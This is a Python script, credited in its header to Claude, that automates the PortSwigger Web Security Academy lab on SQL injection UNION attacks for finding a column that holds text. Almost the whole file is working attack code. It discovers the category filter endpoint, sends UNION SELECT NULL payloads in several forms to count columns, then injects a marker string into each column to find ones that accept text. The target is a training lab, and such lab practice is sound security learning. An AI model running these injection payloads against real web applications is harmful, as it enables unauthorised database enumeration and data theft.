#!/usr/bin/env python3
"""
PortSwigger Lab Solver - SQL Injection UNION Attack, Finding Text Column
Improved version with better endpoint detection and faster execution
Author: Enhanced by Claude
Target: SQL injection UNION attack, finding a column containing text
"""

import requests
import sys
import argparse
import time
import re
import random
import string
from urllib.parse import urljoin, urlparse, quote_plus
from bs4 import BeautifulSoup
from colorama import init, Fore, Back, Style
from rich.console import Console
from rich.panel import Panel
from rich.progress import track
from rich.table import Table
from rich import print as rprint

# Initialize colorama and rich
init(autoreset=True)
console = Console()

class PortSwiggerUnionTextColumnSolver:
    """Optimized solver for UNION text column detection"""
    
    def __init__(self, lab_url):
        """Initialize the UNION text column solver"""
        self.lab_url = lab_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.solved = False
        self.columns_count = 0
        self.filter_endpoint = None
        self.text_columns = []
        self.random_value = None
    
    def log_info(self, message):
        """Log info message with style"""
        rprint(f"[bold blue][+][/bold blue] {message}")
    
    def log_success(self, message):
        """Log success message with style"""
        rprint(f"[bold green][✓][/bold green] {message}")
    
    def log_warning(self, message):
        """Log warning message with style"""
        rprint(f"[bold yellow][!][/bold yellow] {message}")
    
    def log_error(self, message):
        """Log error message with style"""
        rprint(f"[bold red][×][/bold red] {message}")
    
    def log_attack(self, message):
        """Log attack message with style"""
        rprint(f"[bold magenta][🎯][/bold magenta] {message}")
    
    def print_banner(self):
        """Print elite hacker-style banner"""
        banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                  🔥 PORTSWIGGER LAB SOLVER 🔥                ║
    ║                    Enhanced Exploitation Framework           ║
    ║                                                              ║
    ║    Target: UNION Attack Text Column Detection                ║
    ║    Objective: Identify string-compatible columns            ║
    ║    Status: INITIALIZING OPTIMIZED ENUMERATION...            ║
    ╚══════════════════════════════════════════════════════════════╝
        """
        console.print(Panel(banner, style="bold red"))
    
    def check_lab_accessibility(self):
        """Verify that the lab is accessible"""
        try:
            self.log_info("Checking lab accessibility...")
            response = self.session.get(self.lab_url, timeout=10)
            
            if response.status_code == 200:
                self.log_success(f"Lab accessible at {self.lab_url}")
                return True
            else:
                self.log_error(f"Lab returned status code: {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            self.log_error(f"Failed to access lab: {str(e)}")
            return False
    
    def extract_random_value_from_lab(self):
        """Extract the random value provided by the lab with improved detection"""
        try:
            self.log_info("Extracting random value from lab page...")
            response = self.session.get(self.lab_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for the random value in various places with improved patterns
            page_text = response.text
            
            # Enhanced patterns for lab-provided values
            patterns = [
                r"Make the database retrieve the string:\s*['\"]?([a-zA-Z0-9]{6,})['\"]?",
                r"make this appear:\s*['\"]?([a-zA-Z0-9]{6,})['\"]?",
                r"random value:\s*['\"]?([a-zA-Z0-9]{6,})['\"]?",
                r"value provided:\s*['\"]?([a-zA-Z0-9]{6,})['\"]?",
                r"make appear:\s*['\"]?([a-zA-Z0-9]{6,})['\"]?",
                r"retrieve the string:\s*['\"]?([a-zA-Z0-9]{6,})['\"]?",
                r"contain the value\s*['\"]?([a-zA-Z0-9]{6,})['\"]?",
                r"containing the value\s*['\"]?([a-zA-Z0-9]{6,})['\"]?",
                r"'([A-Z0-9]{6,})'",  # All caps alphanumeric in single quotes
                r'"([A-Z0-9]{6,})"',  # Same but double quotes
                r"<[^>]*>([A-Z0-9]{6,})</[^>]*>",  # In HTML tags
                r"\b([A-Z]{2}[A-Z0-9]{4,})\b"  # At least 6 chars, starting with 2 letters
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, page_text, re.IGNORECASE)
                if matches:
                    for match in matches:
                        candidate = match.strip()
                        # Skip common SQL/security terms and ensure reasonable length
                        if (len(candidate) >= 6 and candidate.upper() not in 
                            ['UNION', 'SELECT', 'NULL', 'COLUMN', 'STRING', 'ATTACK', 'INJECT', 'TABLE', 'WHERE']):
                            self.random_value = candidate
                            self.log_success(f"Random value extracted: {self.random_value}")
                            return True
            
            # Look in specific sections
            sections_to_check = [
                soup.find('section', class_='maincontainer'),
                soup.find('div', class_='lab-description'),
                soup.find('div', id='lab'),
                soup.find('main')
            ]
            
            for section in sections_to_check:
                if section:
                    section_text = section.get_text()
                    # Look for standalone alphanumeric strings
                    standalone_matches = re.findall(r"\b([A-Z0-9]{6,})\b", section_text)
                    for match in standalone_matches:
                        if match not in ['UNION', 'SELECT', 'NULL', 'COLUMN', 'STRING', 'ATTACK']:
                            self.random_value = match
                            self.log_success(f"Random value found in section: {self.random_value}")
                            return True
            
            # Fallback - generate our own test value
            self.random_value = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
            self.log_warning(f"Could not extract lab value, using generated: {self.random_value}")
            return True
            
        except Exception as e:
            self.log_error(f"Error extracting random value: {str(e)}")
            # Generate fallback value
            self.random_value = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
            self.log_warning(f"Using fallback generated value: {self.random_value}")
            return True
    
    def find_filter_endpoint(self):
        """Find the correct filter endpoint by analyzing the page structure"""
        try:
            response = self.session.get(self.lab_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for category filter links
            category_links = soup.find_all('a', href=re.compile(r'category='))
            
            if category_links:
                first_link = category_links[0]['href']
                if '?' in first_link:
                    base_endpoint = first_link.split('?')[0]
                else:
                    base_endpoint = first_link
                
                # Construct full URL
                if base_endpoint.startswith('http'):
                    self.filter_endpoint = base_endpoint
                else:
                    self.filter_endpoint = urljoin(self.lab_url, base_endpoint)
                
                self.log_success(f"Filter endpoint found: {self.filter_endpoint}")
                return True
            
            # Try common endpoints if no links found
            endpoints_to_try = ["/filter", "/", "/category", "/search"]
            
            for endpoint in endpoints_to_try:
                test_url = urljoin(self.lab_url, endpoint)
                try:
                    # Test with a simple category parameter
                    test_response = self.session.get(test_url, params={'category': 'Pets'}, timeout=5)
                    if test_response.status_code == 200:
                        self.filter_endpoint = test_url
                        self.log_success(f"Working endpoint found: {self.filter_endpoint}")
                        return True
                except:
                    continue
            
            # Default to filter if nothing else works
            self.filter_endpoint = urljoin(self.lab_url, "/filter")
            self.log_warning(f"Using default endpoint: {self.filter_endpoint}")
            return True
            
        except Exception as e:
            self.log_error(f"Error finding filter endpoint: {str(e)}")
            self.filter_endpoint = urljoin(self.lab_url, "/filter")
            return True
    
    def determine_column_count(self):
        """Determine the number of columns using optimized UNION NULL technique"""
        self.log_attack("Determining column count with optimized approach...")
        
        if not self.find_filter_endpoint():
            return False
        
        # Start with common column counts (most PortSwigger labs use 3-4 columns)
        column_counts_to_try = [3, 4, 2, 5, 1, 6, 7, 8, 9, 10]
        
        # Optimized payload formats - simpler and more reliable
        payload_formats = [
            "' UNION SELECT {nulls}--",
            "'+UNION+SELECT+{nulls}--",
            "' UNION ALL SELECT {nulls}--",
            "'||'1'||' UNION SELECT {nulls}--"
        ]
        
        for columns in column_counts_to_try:
            self.log_attack(f"Testing {columns} columns...")
            
            nulls = ','.join(['NULL'] * columns)
            
            for payload_format in payload_formats:
                payload = payload_format.format(nulls=nulls)
                
                try:
                    # Test with GET parameters
                    response = self.session.get(
                        self.filter_endpoint, 
                        params={'category': payload},
                        timeout=10
                    )
                    
                    # Check response status and content
                    if response.status_code == 200:
                        # Look for indicators of successful UNION
                        response_lower = response.text.lower()
                        
                        # Check for database errors (indicates wrong column count)
                        error_indicators = [
                            'error', 'exception', 'syntax error', 
                            'operand should contain', 'column count',
                            'mismatch', 'internal server error'
                        ]
                        
                        has_error = any(indicator in response_lower for indicator in error_indicators)
                        
                        if not has_error:
                            # Additional validation - check for reasonable content
                            soup = BeautifulSoup(response.text, 'html.parser')
                            
                            # Look for product listings or table content
                            has_content = (
                                len(response.text) > 1000 or
                                soup.find_all(['div', 'tr', 'td'], class_=re.compile(r'product', re.I)) or
                                soup.find_all(['tr', 'td']) or
                                'product' in response_lower
                            )
                            
                            if has_content:
                                self.log_success(f"✓ Found {columns} columns with payload: {payload[:30]}...")
                                self.columns_count = columns
                                return True
                    
                    elif response.status_code == 500:
                        # Database error - wrong column count, try next
                        continue
                    else:
                        # Other HTTP error - try next payload format
                        continue
                        
                except requests.exceptions.RequestException:
                    # Network error - try next payload format
                    continue
            
            # If no payload format worked for this column count, try next count
            self.log_warning(f"✗ {columns} columns - No working payload found")
        
        self.log_error("Could not determine column count with any tested configuration")
        return False
    
    def identify_text_columns_fast(self):
        """Fast identification of text-compatible columns"""
        if not self.random_value or self.columns_count == 0:
            self.log_error("Missing prerequisites for text column identification")
            return False
        
        self.log_attack("Identifying text-compatible columns...")
        
        # Test each column position
        for col_pos in range(self.columns_count):
            self.log_attack(f"Testing column {col_pos + 1}/{self.columns_count}...")
            
            # Build payload with random value in current position
            payload_parts = ['NULL'] * self.columns_count
            payload_parts[col_pos] = f"'{self.random_value}'"
            
            # Use the most common working payload format
            payload = f"' UNION SELECT {','.join(payload_parts)}--"
            
            try:
                response = self.session.get(
                    self.filter_endpoint,
                    params={'category': payload},
                    timeout=10
                )
                
                if response.status_code == 200:
                    # Check if our random value appears in the response
                    if self.random_value in response.text:
                        self.log_success(f"🎯 Column {col_pos + 1} accepts text data!")
                        self.log_success(f"✓ Random value '{self.random_value}' found in response!")
                        self.text_columns.append(col_pos + 1)
                        
                        # Check if lab is solved
                        time.sleep(1)
                        lab_response = self.session.get(self.lab_url)
                        if self.is_lab_solved(lab_response.text):
                            self.log_success("🏆 LAB SOLVED!")
                            self.solved = True
                            return True
                    else:
                        # Check for errors that indicate incompatible column type
                        error_indicators = ['error', 'exception', 'invalid', 'incompatible']
                        if any(indicator in response.text.lower() for indicator in error_indicators):
                            self.log_warning(f"✗ Column {col_pos + 1} - Type incompatible")
                        else:
                            self.log_info(f"? Column {col_pos + 1} - No visible output")
                
                elif response.status_code == 500:
                    # Database error - likely incompatible type
                    self.log_warning(f"✗ Column {col_pos + 1} - Database error (incompatible type)")
                else:
                    self.log_warning(f"✗ Column {col_pos + 1} - HTTP error: {response.status_code}")
                    
            except requests.exceptions.RequestException as e:
                self.log_error(f"Error testing column {col_pos + 1}: {str(e)}")
                continue
        
        if self.text_columns:
            self.log_success(f"Text-compatible columns found: {self.text_columns}")
            self.solved = True
            return True
        else:
            self.log_error("No text-compatible columns identified")
            return False
    
    def is_lab_solved(self, response_text):
        """Check if lab is solved"""
        success_indicators = [
            "congratulations, you solved the lab!",
            "lab solved", "well done!", "success"
        ]
        
        soup = BeautifulSoup(response_text, 'html.parser')
        page_text = soup.get_text().lower()
        
        return any(indicator in page_text for indicator in success_indicators)
    
    def generate_results_table(self):
        """Generate results table"""
        if not self.text_columns:
            return
            
        table = Table(title="🎯 UNION Text Column Analysis Results", style="bold cyan")
        
        table.add_column("Column #", style="bold yellow")
        table.add_column("Text Compatible", style="bold")
        table.add_column("Status", style="bold")
        
        for i in range(1, self.columns_count + 1):
            if i in self.text_columns:
                table.add_row(
                    str(i), 
                    "✓ YES", 
                    "[bold green]ACCEPTS TEXT[/bold green]"
                )
            else:
                table.add_row(
                    str(i), 
                    "✗ NO", 
                    "[bold red]NOT TESTED/INCOMPATIBLE[/bold red]"
                )
        
        console.print(table)
    
    def run(self):
        """Main execution method"""
        self.print_banner()
        
        # Check lab accessibility
        if not self.check_lab_accessibility():
            self.log_error("Cannot proceed - lab is not accessible")
            return False
        
        # Extract random value
        if not self.extract_random_value_from_lab():
            return False
        
        # Determine column count
        if not self.determine_column_count():
            self.log_error("Failed to determine column count")
            return False
        
        # Identify text columns
        if not self.identify_text_columns_fast():
            self.log_error("Failed to identify text columns")
            return False
        
        # Generate results
        self.generate_results_table()
        
        if self.solved:
            console.print(Panel(
                f"🎯 [bold green]MISSION ACCOMPLISHED![/bold green] 🎯\n"
                f"UNION text column detection executed successfully!\n"
                f"Target string: [bold cyan]{self.random_value}[/bold cyan]\n"
                f"Total columns: [bold yellow]{self.columns_count}[/bold yellow]\n"
                f"Text columns: [bold green]{self.text_columns}[/bold green]\n"
                f"Lab status: [bold green]SOLVED[/bold green]",
                style="bold green",
                title="🏆 TEXT COLUMNS DETECTED 🏆"
            ))
            return True
        else:
            console.print(Panel(
                "❌ [bold red]MISSION FAILED[/bold red] ❌\n"
                f"Target string: [bold red]{self.random_value}[/bold red]\n"
                f"Total columns: [bold yellow]{self.columns_count}[/bold yellow]\n"
                f"Text columns: [bold red]{self.text_columns}[/bold red]\n"
                f"Lab status: [bold red]UNSOLVED[/bold red]",
                style="bold red",
                title="💀 ATTACK UNSUCCESSFUL 💀"
            ))
            return False

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="PortSwigger Lab Solver - UNION Text Column Detection (Enhanced)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 solver.py https://0a3a003404af21278051d53b003f0016.web-security-academy.net
  python3 solver.py -u https://your-lab-url.web-security-academy.net
        """
    )
    
    parser.add_argument('url', nargs='?', help='Lab URL')
    parser.add_argument('-u', '--url', dest='url_flag', help='Lab URL')
    
    args = parser.parse_args()
    
    # Get URL from either positional argument or flag
    lab_url = args.url or args.url_flag
    
    if not lab_url:
        console.print("[bold red]Error:[/bold red] Please provide a lab URL")
        console.print("Usage: python3 solver.py <LAB_URL>")
        sys.exit(1)
    
    # Validate URL format
    parsed = urlparse(lab_url)
    if not parsed.scheme or not parsed.netloc:
        console.print("[bold red]Error:[/bold red] Invalid URL format")
        console.print("URL should be like: https://abc123.web-security-academy.net")
        sys.exit(1)
    
    try:
        # Initialize and run the solver
        solver = PortSwiggerUnionTextColumnSolver(lab_url)
        success = solver.run()
        
        # Exit with appropriate code
        sys.exit(0 if success else 1)
        
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Attack interrupted by user[/bold yellow]")
        sys.exit(1)
    except Exception as e:
        console.print(f"[bold red]Fatal error:[/bold red] {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()